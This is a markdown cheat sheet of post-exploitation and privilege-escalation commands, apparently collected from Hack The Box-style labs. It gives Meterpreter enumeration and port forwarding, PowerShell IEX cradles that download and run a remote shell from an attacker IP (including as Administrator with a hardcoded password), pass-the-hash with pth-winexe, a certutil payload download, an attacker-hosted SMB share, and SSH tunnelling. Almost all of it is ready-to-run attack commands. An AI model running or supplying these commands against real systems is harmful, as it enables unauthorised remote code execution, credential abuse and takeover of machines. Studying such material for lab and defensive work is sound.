## Meterpreter
### Enumerators
```
run post/multi/recon/local_exploit_suggester
```
### Get Powershell
```
load powershell
powershell_shell
```
### Port forward
```
portfw add -l 455 -p 455 -r 127.0.0.1
```
## Windows
### Initial
```
whoami /all
```
### Script
```
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PowerUp.ps1') | powershell -noprofile -
```

### Check permission
```
Get-ACL administrator | Fl *
```

### Run as user
```
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.3/shell')" -Credential $cred
```

### Change file permission
```
cacls root.txt /t /e /p Alfred:F
```

### With NTLM hash
```
pth-winexe -U jeeves/administrator //10.10.10.63 cmd.exe
```

### smbserver.py
On attacker machine
```
sudo smbserver.py quang `pwd`
```

On victim machine
```
New-PSDrive -Name "yoyo" -PSProvider FileSystem -Root "\\10.10.14.3\quang"
cd yoyo:
```
### wget
```
certutil -urlcache -f http://123.123.123.123/file c:/user/administrator/file
```
or Create ps file with
```
$client = new-object System.Net.WebClient
$client.DownloadFile("http://10.10.14.3/shell.exe","C:\users\kohsuke\shell.exe")
```

## Bash
```
sockstat -l
cat .bash_history
history
sudo -l
```
### port forward
Attacker to victim
```
ssh -L attackerport:127.0.0.1:victimport user@domain
```
Victim to attacker
```
ssh -R attackerport:127.0.0.1:victimport user@attacker
```
## Others
### LinEnum
### linuxprivchecker.py
### pspy32
Find scheduled jobs without root
### windows exploit suggester
```
python windows-exploit-suggester.py --database 2020-05-19-mssb.xls --systeminfo systeminfo.txt
```
### https://www.fuzzysecurity.com/tutorials/16.html
